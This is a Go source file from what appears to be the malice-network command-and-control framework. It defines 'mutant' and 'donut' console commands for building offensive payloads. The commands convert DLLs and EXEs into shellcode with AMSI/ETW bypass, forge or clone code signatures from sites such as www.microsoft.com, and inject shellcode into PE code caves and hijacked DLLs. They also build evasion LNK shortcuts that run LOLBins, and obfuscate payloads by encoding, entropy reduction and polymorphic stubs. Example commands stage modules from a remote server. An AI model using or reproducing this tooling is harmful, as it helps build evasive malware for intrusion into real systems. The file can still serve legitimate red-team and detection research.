package mutant

import (
	"github.com/carapace-sh/carapace"
	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/malice-network/client/command/common"
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/helper/intermediate"
	"github.com/chainreactors/mals"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"github.com/wabzsy/gonut"
)

func Commands(con *core.Console) []*cobra.Command {
	// Create mutant parent command
	mutantCmd := &cobra.Command{
		Use:   "mutant",
		Short: "Malefic-mutant tools for PE/DLL manipulation",
		Long:  "Tools for converting DLL to shellcode, patching runtime config, encoding payloads, and PE manipulation",
		RunE: func(cmd *cobra.Command, args []string) error {
			return cmd.Help()
		},
	}

	// Donut command - standalone, not under mutant
	donutCmd := &cobra.Command{
		Use:   consts.CommandDonut,
		Short: "donut cmd",
		Long:  "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory ",
		Example: `
  donut -i c2.dll
  donut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
  donut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
  donut -z2 -k2 -t -i loader.exe -o out.bin
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return DonutCmd(cmd, con)
		},
	}
	common.BindFlag(donutCmd, func(f *pflag.FlagSet) {
		f.StringP("modname", "n", "", "Module name for HTTP staging. If entropy is enabled, this is generated randomly.")
		f.StringP("server", "s", "", "Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/")
		f.Uint32P("entropy", "e", uint32(gonut.DONUT_ENTROPY_DEFAULT),
			`Entropy:
	1=None
	2=Use random names
	3=Random names + symmetric encryption
	`)

		// -PIC/SHELLCODE OPTIONS-
		f.IntP("arch", "a", int(gonut.DONUT_ARCH_X96),
			`Target architecture:
	1=x86
	2=amd64
	3=x86+amd64
	`)
		f.StringP("output", "o", "shellcode", "Output file to save loader.")
		f.IntP("format", "f", int(gonut.DONUT_FORMAT_BINARY),
			`Output format:
	1=Binary
	2=Base64
	3=C
	4=Ruby
	5=Python
	6=Powershell
	7=C#
	8=Hex
	9=UUID
	10=Golang
	11=Rust
	`)
		f.Uint32P("oep", "y", 0, "Create thread for loader and continue execution at <addr> supplied. (eg. 0x1234)")
		f.Uint32P("exit", "x", uint32(gonut.DONUT_OPT_EXIT_THREAD),
			`Exit behaviour:
	1=Exit thread
	2=Exit process
	3=Do not exit or cleanup and block indefinitely
	`)

		// -FILE OPTIONS-
		f.StringP("class", "c", "", "Optional class name. (required for .NET DLL, format: namespace.class)")
		f.StringP("domain", "d", "", "AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.")
		f.StringP("input", "i", "", "Input file to execute in-memory.")
		f.StringP("method", "m", "", "Optional method or function for DLL. (a method is required for .NET DLL)")
		f.StringP("args", "p", "", "Optional parameters/command line inside quotations for DLL method/function or EXE.")
		f.BoolP("unicode", "w", false, "Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)")
		f.StringP("runtime", "r", "", "CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.")
		f.BoolP("thread", "t", false, "Execute the entrypoint of an unmanaged EXE as a thread.")

		// -EXTRA-
		f.Uint32P("compress", "z", uint32(gonut.GONUT_COMPRESS_NONE),
			`Pack/Compress file:
	1=None
	2=aPLib         [experimental]
	3=LZNT1  (RTL)  [experimental, Windows only]
	4=Xpress (RTL)  [experimental, Windows only]
	5=LZNT1         [experimental]
	6=Xpress        [experimental, recommended]
	`)
		f.Uint32P("bypass", "b", uint32(gonut.DONUT_BYPASS_CONTINUE),
			`Bypass AMSI/WLDP/ETW:
	1=None
	2=Abort on fail
	3=Continue on fail
	`)
		f.Uint32P("headers", "k", uint32(gonut.DONUT_HEADERS_OVERWRITE),
			`Preserve PE headers:
	1=Overwrite
	2=Keep all
	`)
		f.StringP("decoy", "j", "", "Optional path of decoy module for Module Overloading.")

		// -OTHER-
		f.BoolP("verbose", "v", false, "verbose output")

		f.SortFlags = false
	})

	common.BindFlagCompletions(donutCmd, func(comp carapace.ActionMap) {
		comp["input"] = carapace.ActionFiles().Usage("file path")
	})

	// SRDI command - DLL to Shellcode
	srdiCmd := &cobra.Command{
		Use:   "srdi",
		Short: "Convert DLL to shellcode using SRDI",
		Long:  "Generate SRDI shellcode from DLL files with support for TLS",
		Example: `
  mutant srdi -i beacon.dll -o beacon.bin
  mutant srdi -i beacon.dll -a x64 --function-name ReflectiveLoader
  mutant srdi -i beacon.dll -t malefic --userdata-path userdata.bin
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return SrdiCmd(cmd, con)
		},
	}
	common.BindFlag(srdiCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Source DLL file path")
		f.StringP("output", "o", "", "Target shellcode path (default: <input>.bin)")
		f.StringP("arch", "a", "x64", "Architecture: x86 or x64")
		f.StringP("function-name", "", "", "Function name")
		f.StringP("platform", "p", "win", "Platform: win")
		f.StringP("type", "t", "malefic", "SRDI type: malefic")
		f.StringP("userdata-path", "", "", "User data file path")
		f.SortFlags = false
	})
	bindToolTimeout(srdiCmd)
	common.BindFlagCompletions(srdiCmd, func(comp carapace.ActionMap) {
		comp["input"] = carapace.ActionFiles().Usage("DLL file path")
		comp["output"] = carapace.ActionFiles().Usage("output file path")
		comp["userdata-path"] = carapace.ActionFiles().Usage("userdata file path")
	})

	// Strip command - Remove paths from binary
	stripCmd := &cobra.Command{
		Use:   "strip",
		Short: "Strip paths from binary files",
		Long:  "Remove build paths and other sensitive information from binary files",
		Example: `
  mutant strip -i malefic.exe -o malefic-stripped.exe
  mutant strip -i malefic.exe --custom-paths /home/user,/opt/build
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return StripCmd(cmd, con)
		},
	}
	common.BindFlag(stripCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Source binary file path")
		f.StringP("output", "o", "", "Output binary file path (default: <input>.stripped)")
		f.StringP("custom-paths", "", "", "Additional custom paths to replace (comma separated)")
		f.SortFlags = false
	})
	bindToolTimeout(stripCmd)
	common.BindFlagCompletions(stripCmd, func(comp carapace.ActionMap) {
		comp["input"] = carapace.ActionFiles().Usage("binary file path")
		comp["output"] = carapace.ActionFiles().Usage("output file path")
	})

	// Sigforge command - PE signature manipulation
	sigforgeCmd := &cobra.Command{
		Use:   "sigforge",
		Short: "PE file signature manipulation tool",
		Long:  "Extract, copy, inject, remove, or check PE file signatures",
		Example: `
  mutant sigforge --operation extract --source signed.exe --output signature.bin
  mutant sigforge --operation copy --source signed.exe --target unsigned.exe --output result.exe
  mutant sigforge --operation inject --source unsigned.exe --signature signature.bin --output signed.exe
  mutant sigforge --operation remove --source signed.exe --output unsigned.exe
  mutant sigforge --operation check --source target.exe
  mutant sigforge --operation carbon-copy --host www.microsoft.com --target unsigned.exe --output result.exe
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return SigforgeCmd(cmd, con)
		},
	}
	common.BindFlag(sigforgeCmd, func(f *pflag.FlagSet) {
		f.StringP("operation", "", "", "Operation: extract, copy, inject, remove, check, or carbon-copy")
		f.StringP("source", "s", "", "Source PE file")
		f.StringP("target", "t", "", "Target PE file (for copy operation)")
		f.StringP("signature", "", "", "Signature file (for inject operation)")
		f.String("host", "", "Remote host for carbon-copy")
		f.Uint16("port", 443, "Remote port for carbon-copy")
		f.String("cert-file", "", "Local certificate file for carbon-copy")
		f.StringP("output", "o", "", "Output file path")
		f.SortFlags = false
	})
	bindToolTimeout(sigforgeCmd)
	common.BindFlagCompletions(sigforgeCmd, func(comp carapace.ActionMap) {
		comp["source"] = carapace.ActionFiles().Usage("source PE file")
		comp["target"] = carapace.ActionFiles().Usage("target PE file")
		comp["signature"] = carapace.ActionFiles().Usage("signature file")
		comp["cert-file"] = carapace.ActionFiles().Usage("certificate file")
		comp["output"] = carapace.ActionFiles().Usage("output file path")
	})

	patchCmd := &cobra.Command{
		Use:   "patch",
		Short: "Patch runtime config blob in compiled binaries",
		RunE: func(cmd *cobra.Command, args []string) error {
			return PatchCmd(cmd, con)
		},
	}
	common.BindFlag(patchCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Target binary file")
		f.StringP("config", "c", "", "Runtime config file")
		f.String("from-implant", "", "Generate runtime config from implant.yaml")
		f.StringP("output", "o", "", "Output file path")
		f.Uint64("obf-seed", 0, "Master obfuscation seed")
		f.StringArray("set", nil, "Generic JSON merge override, can be repeated")
		f.SortFlags = false
	})
	bindToolTimeout(patchCmd)

	objcopyCmd := &cobra.Command{
		Use:   "objcopy",
		Short: "Object copy utility for binary extraction",
		RunE: func(cmd *cobra.Command, args []string) error {
			return ObjcopyCmd(cmd, con)
		},
	}
	common.BindFlag(objcopyCmd, func(f *pflag.FlagSet) {
		f.StringP("format", "f", "binary", "Output format")
		f.StringP("input", "i", "", "Input file path")
		f.StringP("output", "o", "", "Output file path")
		f.SortFlags = false
	})
	bindToolTimeout(objcopyCmd)

	encodeCmd := &cobra.Command{
		Use:   "encode",
		Short: "Payload encoding tool",
		RunE: func(cmd *cobra.Command, args []string) error {
			return EncodeCmd(cmd, con)
		},
	}
	common.BindFlag(encodeCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Input binary file")
		f.StringP("encoding", "e", "xor", "Encoding method")
		f.StringP("output", "o", "", "Output file path")
		f.StringP("format", "f", "bin", "Output format: bin, c, rust, all")
		f.BoolP("list", "l", false, "List available encodings")
		f.SortFlags = false
	})
	bindToolTimeout(encodeCmd)

	entropyCmd := &cobra.Command{
		Use:   "entropy",
		Short: "Measure and reduce PE Shannon entropy",
		RunE: func(cmd *cobra.Command, args []string) error {
			return EntropyCmd(cmd, con)
		},
	}
	common.BindFlag(entropyCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Input PE file")
		f.StringP("output", "o", "", "Output file path")
		f.Float64P("threshold", "t", 6.0, "Target entropy threshold")
		f.StringP("strategy", "s", "null_bytes", "Reduction strategy")
		f.Float64("max-growth", 5.0, "Maximum file growth multiplier")
		f.Bool("measure-only", false, "Only measure entropy")
		f.SortFlags = false
	})
	bindToolTimeout(entropyCmd)

	binderCmd := &cobra.Command{
		Use:   "binder",
		Short: "Bind, extract, or check embedded PE payloads",
		RunE: func(cmd *cobra.Command, args []string) error {
			return cmd.Help()
		},
	}
	binderBindCmd := &cobra.Command{Use: "bind", Short: "Bind a secondary PE onto a primary PE", RunE: func(cmd *cobra.Command, args []string) error { return BinderCmd(cmd, con) }}
	binderExtractCmd := &cobra.Command{Use: "extract", Short: "Extract an embedded secondary PE", RunE: func(cmd *cobra.Command, args []string) error { return BinderCmd(cmd, con) }}
	binderCheckCmd := &cobra.Command{Use: "check", Short: "Check for an embedded payload", RunE: func(cmd *cobra.Command, args []string) error { return BinderCmd(cmd, con) }}
	binderBindCmd.Flags().StringP("primary", "p", "", "Primary PE file")
	binderBindCmd.Flags().StringP("secondary", "s", "", "Secondary PE file")
	binderBindCmd.Flags().StringP("output", "o", "", "Output file path")
	binderExtractCmd.Flags().StringP("input", "i", "", "Bound PE file")
	binderExtractCmd.Flags().StringP("output", "o", "", "Output file path")
	binderCheckCmd.Flags().StringP("input", "i", "", "Input file")
	bindToolTimeout(binderBindCmd)
	bindToolTimeout(binderExtractCmd)
	bindToolTimeout(binderCheckCmd)
	binderCmd.AddCommand(binderBindCmd, binderExtractCmd, binderCheckCmd)

	iconCmd := &cobra.Command{
		Use:   "icon",
		Short: "Replace or extract icons in PE files",
		RunE: func(cmd *cobra.Command, args []string) error {
			return cmd.Help()
		},
	}
	iconReplaceCmd := &cobra.Command{Use: "replace", Short: "Replace PE icon", RunE: func(cmd *cobra.Command, args []string) error { return IconCmd(cmd, con) }}
	iconExtractCmd := &cobra.Command{Use: "extract", Short: "Extract PE icon", RunE: func(cmd *cobra.Command, args []string) error { return IconCmd(cmd, con) }}
	iconReplaceCmd.Flags().StringP("input", "i", "", "Input PE file")
	iconReplaceCmd.Flags().String("ico", "", "ICO file")
	iconReplaceCmd.Flags().StringP("output", "o", "", "Output PE file")
	iconExtractCmd.Flags().StringP("input", "i", "", "Input PE file")
	iconExtractCmd.Flags().StringP("output", "o", "", "Output ICO file")
	bindToolTimeout(iconReplaceCmd)
	bindToolTimeout(iconExtractCmd)
	iconCmd.AddCommand(iconReplaceCmd, iconExtractCmd)

	mutateCmd := &cobra.Command{
		Use:   "mutate",
		Short: "Generate mutated artifacts offline",
		RunE: func(cmd *cobra.Command, args []string) error {
			return MutateCmd(cmd, con)
		},
	}
	common.BindFlag(mutateCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Input file")
		f.StringP("config", "c", "", "implant.yaml profile")
		f.StringP("output", "o", "", "Single output file")
		f.String("out-dir", "", "Offline output directory")
		f.UintP("count", "n", 0, "Number of offline variants")
		f.StringP("encoding", "e", "", "Encoding pipeline")
		f.StringP("format", "f", "", "Output format: shellcode, pe, lnk, proxydll")
		f.String("carrier", "", "Carrier PE path")
		f.String("technique", "", "BDF execution technique")
		f.Bool("stub-poly", false, "Enable polymorphic stub")
		f.Bool("stub-encrypt", false, "Enable stub self-encryption")
		f.Bool("add-section", false, "Force add new PE section")
		f.Bool("block", false, "Never return to original entry point")
		f.String("block-method", "", "Block method")
		f.Bool("no-relink", false, "Disable relink mutations")
		f.String("lnk-method", "", "LNK extraction method")
		f.String("lnk-target", "", "LNK LOLBin target path")
		f.String("lnk-icon", "", "LNK icon path")
		f.String("srdi", "", "SRDI conversion type")
		f.String("srdi-arch", "x64", "SRDI architecture")
		f.String("srdi-function", "", "SRDI function name")
		f.String("srdi-userdata", "", "SRDI userdata path")
		f.Bool("list", false, "List encodings and formats")
		f.SortFlags = false
	})
	bindToolTimeout(mutateCmd)

	bdfCmd := &cobra.Command{
		Use:   "bdf",
		Short: "Patch PE binary with shellcode",
		RunE: func(cmd *cobra.Command, args []string) error {
			return BdfCmd(cmd, con)
		},
	}
	common.BindFlag(bdfCmd, func(f *pflag.FlagSet) {
		f.StringP("input", "i", "", "Target PE binary")
		f.StringP("payload", "p", "", "Shellcode file to inject")
		f.StringP("output", "o", "", "Output file path")
		f.Bool("find-caves", false, "Only find code caves")
		f.Bool("add-section", false, "Force add new section")
		f.String("section-name", "", "Section name")
		f.String("min-cave", "", "Minimum code cave size")
		f.Bool("marker", false, "Use built-in marker shellcode")
		f.Bool("aslr", false, "Keep ASLR enabled")
		f.Bool("no-zero-cert", false, "Do not zero certificate table")
		f.String("wait", "", "Thread wait mode")
		f.StringP("technique", "t", "", "Execution technique")
		f.String("stub-hash", "", "Stub hash algorithm")
		f.Bool("stub-poly", false, "Enable polymorphic stub")
		f.Bool("stub-encrypt", false, "Enable stub self-encryption")
		f.String("evasion", "", "Evasion preset")
		f.String("seed", "", "RNG seed")
		f.Bool("block", false, "Never return to original EP")
		f.String("block-method", "", "Block method")
		f.SortFlags = false
	})
	bindToolTimeout(bdfCmd)

	watermarkCmd := &cobra.Command{Use: "watermark", Short: "PE watermark embedding and reading", RunE: func(cmd *cobra.Command, args []string) error { return cmd.Help() }}
	watermarkWriteCmd := &cobra.Command{Use: "write", Short: "Write watermark into a PE file", RunE: func(cmd *cobra.Command, args []string) error { return WatermarkCmd(cmd, con) }}
	watermarkReadCmd := &cobra.Command{Use: "read", Short: "Read watermark from a PE file", RunE: func(cmd *cobra.Command, args []string) error { return WatermarkCmd(cmd, con) }}
	watermarkWriteCmd.Flags().StringP("input", "i", "", "Input PE file")
	watermarkWriteCmd.Flags().StringP("output", "o", "", "Output PE file")
	watermarkWriteCmd.Flags().StringP("method", "m", "", "Watermark method")
	watermarkWriteCmd.Flags().StringP("watermark", "w", "", "Watermark data")
	watermarkReadCmd.Flags().StringP("input", "i", "", "Input PE file")
	watermarkReadCmd.Flags().StringP("method", "m", "", "Watermark method")
	watermarkReadCmd.Flags().StringP("size", "s", "", "Size hint")
	bindToolTimeout(watermarkWriteCmd)
	bindToolTimeout(watermarkReadCmd)
	watermarkCmd.AddCommand(watermarkWriteCmd, watermarkReadCmd)

	lnkCmd := &cobra.Command{Use: "lnk", Short: "Generate evasion LNK shortcut files", RunE: func(cmd *cobra.Command, args []string) error { return cmd.Help() }}
	lnkExecCmd := &cobra.Command{Use: "exec", Short: "Generate command execution LNK", RunE: func(cmd *cobra.Command, args []string) error { return LnkCmd(cmd, con) }}
	lnkEmbedCmd := &cobra.Command{Use: "embed", Short: "Generate LNK with embedded payload", RunE: func(cmd *cobra.Command, args []string) error { return LnkCmd(cmd, con) }}
	lnkExecCmd.Flags().StringP("command", "c", "", "Command to execute")
	lnkExecCmd.Flags().StringP("target", "t", "", "LOLBin target path")
	lnkExecCmd.Flags().StringP("output", "o", "", "Output LNK file")
	lnkExecCmd.Flags().String("icon", "", "Custom icon path")
	lnkExecCmd.Flags().String("icon-index", "", "Icon index")
	lnkExecCmd.Flags().String("name", "", "Shortcut display name")
	lnkExecCmd.Flags().String("padding", "", "Target padding spaces count")
	lnkEmbedCmd.Flags().StringP("input", "i", "", "Payload file to embed")
	lnkEmbedCmd.Flags().StringP("output", "o", "", "Output LNK file")
	lnkEmbedCmd.Flags().StringP("target", "t", "", "LOLBin target path")
	lnkEmbedCmd.Flags().StringP("command", "c", "", "Extract/execute command")
	lnkEmbedCmd.Flags().String("method", "", "Extraction method")
	lnkEmbedCmd.Flags().String("loader", "", "Loader executable path")
	lnkEmbedCmd.Flags().String("xor-key", "", "XOR encoding key")
	lnkEmbedCmd.Flags().String("icon", "", "Custom icon path")
	lnkEmbedCmd.Flags().String("padding", "", "Target padding spaces count")
	bindToolTimeout(lnkExecCmd)
	bindToolTimeout(lnkEmbedCmd)
	lnkCmd.AddCommand(lnkExecCmd, lnkEmbedCmd)

	relinkCmd := &cobra.Command{
		Use:   "relink",
		Short: "PE post-link randomization",
		RunE: func(cmd *cobra.Command, args []string) error {
			return RelinkCmd(cmd, con)
		},
	}
	relinkCmd.Flags().StringP("input", "i", "", "Input PE file")
	relinkCmd.Flags().StringP("output", "o", "", "Output PE file")
	relinkCmd.Flags().String("seed", "", "RNG seed")
	relinkCmd.Flags().String("skip", "", "Skip mutations")
	relinkCmd.Flags().String("only", "", "Only run mutations")
	relinkCmd.Flags().String("padding-size", "", "Overlay padding size")
	relinkCmd.Flags().Bool("dry-run", false, "Only print mutation plan")
	bindToolTimeout(relinkCmd)

	hijackCmd := &cobra.Command{
		Use:   "hijack",
		Short: "Trace-based DLL hijack code cave injection",
		RunE: func(cmd *cobra.Command, args []string) error {
			return HijackCmd(cmd, con)
		},
	}
	hijackCmd.Flags().StringP("input", "i", "", "Input DLL file")
	hijackCmd.Flags().StringP("payload", "p", "", "Payload shellcode file")
	hijackCmd.Flags().StringP("output", "o", "", "Output patched DLL")
	hijackCmd.Flags().Bool("analyze", false, "Analysis-only mode")
	hijackCmd.Flags().String("traces", "", "Number of trace runs")
	hijackCmd.Flags().String("min-cave", "", "Minimum cave size")
	hijackCmd.Flags().String("call-index", "", "Manual call site index")
	hijackCmd.Flags().String("cave-index", "", "Manual cave index")
	hijackCmd.Flags().Bool("verify", false, "Verify patched DLL")
	bindToolTimeout(hijackCmd)

	runCmd := &cobra.Command{
		Use:   "run -- <tool args>",
		Short: "Run a raw malefic-mutant tool command",
		Args:  cobra.ArbitraryArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			return MutantRunCmd(cmd, con)
		},
	}
	runCmd.Flags().StringArray("input-file", nil, "Input mapping remote:local")
	runCmd.Flags().StringArray("output-file", nil, "Output mapping remote:local")
	bindToolTimeout(runCmd)

	// Add subcommands to mutant parent command (excluding donut)
	mutantCmd.AddCommand(srdiCmd, stripCmd, sigforgeCmd, patchCmd, objcopyCmd, encodeCmd, entropyCmd, binderCmd, iconCmd, mutateCmd, bdfCmd, watermarkCmd, lnkCmd, relinkCmd, hijackCmd, runCmd)

	// Enable wizard for mutant commands that need configuration
	common.EnableWizardForCommands(donutCmd, srdiCmd, stripCmd, sigforgeCmd, patchCmd, objcopyCmd, encodeCmd, entropyCmd, mutateCmd)

	// Return mutant as parent command and donut as standalone
	return []*cobra.Command{mutantCmd, donutCmd}
}

func Register(con *core.Console) {
	intermediate.RegisterFunction("exe2shellcode",
		func(exe []byte, arch string, cmdline string) (string, error) {
			bin, err := gonut.DonutShellcodeFromPE("1.exe", exe, arch, cmdline, false, true)
			if err != nil {
				return "", err
			}
			return string(bin), nil
		})
	intermediate.AddHelper("exe2shellcode", &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "exe to shellcode with donut",
		Input: []string{
			"bin: dll bin",
			"arch: architecture",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	intermediate.RegisterFunction("dll2shellcode", func(dll []byte, arch string, cmdline string) (string, error) {
		bin, err := gonut.DonutShellcodeFromPE("1.dll", dll, arch, cmdline, false, true)
		if err != nil {
			return "", err
		}
		return string(bin), nil
	})
	intermediate.AddHelper("dll2shellcode", &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "dll to shellcode with donut",
		Input: []string{
			"bin: dll bin",
			"arch: architecture, x86/x64",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	intermediate.RegisterFunction("clr2shellcode", gonut.DonutFromAssemblyFromFile)
	intermediate.AddHelper("clr2shellcode", &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "clr to shellcode with donut",
		Input: []string{
			"file: path to PE file",
			"arch: architecture, x86/x64",
			"cmdline: cmd args",
			"method: name of method or DLL function to invoke for .NET DLL and unmanaged DLL",
			"classname: name of class with optional namespace for .NET DLL",
			"appdomain: name of domain to create for .NET DLL/EXE",
		},
		Output: []string{
			"shellcode: bin",
		},
	})

	intermediate.RegisterFunction("donut", gonut.DonutShellcodeFromFile)
	intermediate.AddHelper("donut", &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters ",
		Input: []string{
			"file: path to PE file",
			"arch: architecture, x86/x64",
			"cmdline: cmd args",
		},
		Output: []string{
			"shellcode",
		},
	})

	con.RegisterServerFunc("srdi", func(con *core.Console, dll []byte, entry string, arch string, param string) (string, error) {
		bin, err := con.Rpc.DLL2Shellcode(con.Context(), &clientpb.DLL2Shellcode{
			Bin:        dll,
			Arch:       arch,
			Type:       "srdi",
			Entrypoint: entry,
			Params:     param,
		})
		if err != nil {
			return "", err
		}
		return string(bin.Bin), nil
	}, &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "dll/exe to shellcode with srdi",
		Input: []string{
			"bin: dll/exe bin",
			"entry: entry function for dll",
			"arch: architecture, x86/x64",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	con.RegisterServerFunc("sgn_encode", func(con *core.Console, shellcode []byte, arch string, iterations int32) (string, error) {
		bin, err := con.Rpc.ShellcodeEncode(con.Context(), &clientpb.ShellcodeEncode{
			Shellcode:  shellcode,
			Arch:       arch,
			Type:       "sgn",
			Iterations: iterations,
		})
		if err != nil {
			return "", err
		}
		return string(bin.Bin), nil
	}, &mals.Helper{
		Group: intermediate.ArtifactGroup,
		Short: "shellcode encode with sgn",
		Input: []string{
			"bin: shellcode bin",
			"arch: architecture, x86/x64",
			"iterations: sgn iterations",
		},
		Output: []string{
			"shellcode: encoded shellcode bin",
		},
	})
}
